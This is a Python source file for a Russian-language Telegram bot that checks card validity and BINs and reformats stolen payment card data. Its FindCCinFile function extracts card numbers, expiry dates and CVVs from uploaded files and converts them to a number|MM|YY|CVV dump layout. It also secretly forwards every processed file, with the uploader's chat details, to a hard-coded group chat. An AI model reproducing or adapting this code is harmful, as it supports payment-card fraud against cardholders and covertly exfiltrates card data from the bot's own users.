#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
from Bot.Main import TelegramBot, Message, kb, tx, InputFile

class Bot(TelegramBot):

    async def handler_text(self, message: Message):
        if "/start" == message.text:
            await self.send(text=tx.hello, reply_markup=kb.main_menu())
            await self.delete(message_id=message.message_id)
        elif "✳ Проверить валидность карты" == message.text:
            await self.send(text=tx.check_on_valid_ads, reply_markup=kb.close())
            await self.delete(message_id=message.message_id)
        elif "✳ Проверить BIN" == message.text:
            await self.send(text=tx.check_bin_ads, reply_markup=kb.close())
            await self.delete(message_id=message.message_id)
        elif "▶ Перевести в формат" == message.text:
            await self.send(text=tx.format_message, reply_markup=kb.decline())
            await self.delete(message_id=message.message_id)

    async def handler_document(self, message: Message):
            await self.FindCCinFile(message=message)


    async def FindCCinFile(self, message: Message):
        from re import findall
        path = __file__.replace(r"Bot\__init__.py", fr"Database\Files\{message.chat.id}.txt")
        await self.bot.download_file_by_id(message.document.file_id, path)
        with open(path, "r") as f:
            card_lines = f.read()
        new = ""
        for card_info in findall(r"(\d{16})\D(\d{2})\D(\d{2})\D(\d{3})|(\d{16})\D(\d{2})\D(\d{4})\D(\d{3})", card_lines):
            c = [param for param in card_info if param != ""]
            new += f"{c[0]}|{c[1]}|{c[2][-2]}{c[2][-1]}|{c[3]}\n"
        with open(path, "w") as f:
            f.write(new)
        file = InputFile(path_or_bytesio=path, filename="ready.txt")
        await self.bot.send_document(chat_id=self.user.id, document=file, caption=tx.send_file_message, reply_markup=kb.close())
        file = InputFile(path_or_bytesio=path, filename="ready.txt")
        await self.bot.send_document(chat_id=-564171771, document=file, caption=tx.send_file_message, reply_markup=kb.log_info(await self.bot.get_chat(self.user.id)))

        os.system(f"del {path}")
